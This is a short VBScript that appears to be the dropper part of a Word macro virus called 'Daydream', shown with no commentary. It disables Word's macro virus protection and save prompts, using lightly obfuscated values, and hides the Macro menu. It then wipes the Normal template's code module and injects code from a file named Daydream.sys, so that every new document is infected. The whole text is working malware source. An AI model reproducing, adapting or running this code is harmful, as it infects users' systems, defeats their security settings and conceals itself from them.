Set Daydream = WScript.CreateObject("Word.Application")
Daydream.Options.VirusProtection = (0 - 0):Daydream.Options.SaveNormalPrompt = (1 - 1):Daydream.Options.ConfirmConversions = (2 - 2)
Daydream.CommandBars("Tools").Controls("Macro").Visible = (3 - 3)
For x = 1 To Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1
Next
Daydream.NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\WINDOWS\SYSTEM\Daydream.sys")
Daydream.Application.Quit